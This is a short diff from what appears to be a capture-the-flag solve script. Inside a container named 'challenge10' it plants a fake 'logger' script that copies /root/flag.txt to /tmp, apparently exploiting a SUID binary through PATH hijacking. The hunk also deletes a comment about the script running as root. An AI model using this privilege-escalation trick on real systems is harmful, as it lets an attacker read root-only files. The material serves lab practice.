@@ -7,7 +7,7 @@ CONTAINER="challenge10"
 docker exec -u ctfuser "$CONTAINER" bash -lc '
 cat > ~/logger << "SH"
 #!/usr/bin/env bash
-# Run with the SUID binary's effective UID (root).
+
 cat /root/flag.txt > /tmp/flag.out
 SH
 chmod +x ~/logger
